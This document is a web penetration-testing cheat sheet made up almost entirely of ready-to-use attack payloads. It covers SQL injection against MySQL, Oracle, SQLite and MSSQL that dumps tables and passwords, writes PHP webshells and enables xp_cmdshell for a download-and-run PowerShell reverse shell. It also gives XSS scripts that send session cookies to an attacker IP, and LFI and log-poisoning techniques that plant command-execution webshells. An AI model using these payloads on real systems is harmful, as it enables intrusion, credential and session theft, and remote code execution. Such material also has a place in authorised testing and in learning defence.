# Pentest Web
## SQL Injection and Abuse MSSQL
### SQL Injection - MySQL/MariaDB
-> get version
```
-1 union select 1,2,version();#
```

-> get number columns
```
-1 order by 3;#
```

-> get database name
```
-1 union select 1,2,database();#
```

-> get table name
```
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<database_name>";#
```

-> get column name
``` 
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<database_name>" and table_name="<table_name>";#
```

-> dump
```
-1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
```

#### Webshell via SQLI - MySQL
```
LOAD_FILE('/etc/httpd/conf/httpd.conf')    
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
```
 
#### Reading Files via SQLI - MySQL
e.g.  
```
SELECT LOAD_FILE('/etc/passwd')
```

### Oracle SQL
-> Bypass Authentication
```
' or 1=1--
```

-> get number columns
```
' order by 3--
```

-> get table name
```
' union select null,table_name,null from all_tables--
```

-> get column name
```
' union select null,column_name,null from all_tab_columns where table_name='<table_name>'--
```

-> dump
```
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

### SQLite Injection
-> extracting table names, not displaying standard sqlite tables
```
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```
-> extracting table users  
```
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```

-> Reference  
https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf


### MSSQL Injection
-> Bypass Authentication
```
' or 1=1--
```

-> Enable xp_cmdshell
```
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

-> RCE
```
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/InvokePowerShellTcp.ps1')" ;--
```
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

### Abuse MSSQL
-> edit Invoke-PowerShellTcp.ps1, adding this:  
```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```
```
impacket-mssqlclient <user>@<ip> -db <database>
```
```
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
```
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

## Cross-Site Scripting
1-> Identify the language and frameworks used  
2-> Identify entry points (parameters, inputs, responses reflecting values you can control, etc)   
3-> Check how this is reflected in the response via source code preview or browser developer tools  
4-> Check the allowed special characters  
```
< > ' " { } ;
```
5-> Detect if there are filters or blockages and modify as needed to make it work

### Wordlists for XSS Bypass
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/xss_bypass.txt
https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt
https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt

### XSS Auditor and XSS Filter
https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
https://www.chromium.org/developers/design-documents/xss-auditor/
https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge
https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection

### XSS Keylogger
https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/
https://github.com/hadynz/xss-keylogger

### XSS Mutation
http://www.businessinfo.co.uk/labs/mxss/

### XSS Poliglote
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

### XSS - Session Hijacking
```
<script>new Image().src="http://<IP>/ok.jpg?output="+document.cookie;</script>
<script type="text/javascript">document.location="http://<IP>/?cookie="+document.cookie;</script>  
<script>window.location="http://<IP>/?cookie="+document.cookie;</script>
<script>document.location="http://<IP>/?cookie="+document.cookie;</script>  
<script>fetch('http://<IP>/?cookie=' + btoa(document.cookie));</script>  
```

## Local File Inclusion - LFI
### Replace ../ - Bypass
$language = str_replace('../', '', $_GET['file']);  
```
/....//....//....//....//etc/passwd  
..././..././..././..././etc/paswd  
....\/....\/....\/....\/etc/passwd 
```

### Block . and / - Bypass

-> urlencode and Double urlencode /etc/passwd  
```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```
```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```  
### PHP Wrappers

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id  
expect://id  
php://filter/read=convert.base64-encode/resource=index.php  
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

### Filter PHP
-> Predefined Paths  
preg_match('/^\.\/okay\/.+$/', $_GET['file'])  

```
./okay/../../../../etc/passwd
```  

### PHP Extension Bypass with Null Bytes
```
https://site.com/index.php?file=/etc/passwd%00.php
```  
-> Removing .php  
```
https://site.com/index.php?file=index.p.phphp
```  
  
#### LFI + File Upload
-> gif  
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
``` 
https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
-> Zip  
1-  
```
echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php
```
2-  
```
http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg 
```

#### Log Poisoning
-> apache
```
nc ip 80  
<?php system($_GET[‘cmd’]); ?>  
```  
or  
1-  
```
curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'
```
2-  
http://ip/index.php?file=/var/log/apache2/access.log&cmd=id  
  
-> SMTP  
```
telnet ip 23
MAIL FROM: email@gmail.com
RCPT TO: <?php system($_GET[‘cmd’]); ?>  
http://ip/index.php?file=/var/mail/mail.log&cmd=id
```  
  
-> SSH  
```
ssh \'<?php system($_GET['cmd']);?>'@ip  
http://ip/index.php?file=/var/log/auth.log&cmd=id
```  

-> PHP session  
```
http://ip/index.php?file=<?php system($_GET["cmd"]);?>  
http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
```
  
-> Other Paths  
```
/var/log/nginx/access.log  
/var/log/sshd.log  
/var/log/vsftpd.log  
/proc/self/fd/0-50  
```

### Template LFI and directory traversal - Nuclei
https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml

### Wordlists
-> burp-parameter-names.txt - Wordlist for parameter fuzzing  
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
	
-> Wordlist LFI - Linux  
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
	
-> Wordlist LFI - Windows  
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt 
	
-> bypass_lfi.txt  
https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
	
-> poisoning.txt  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  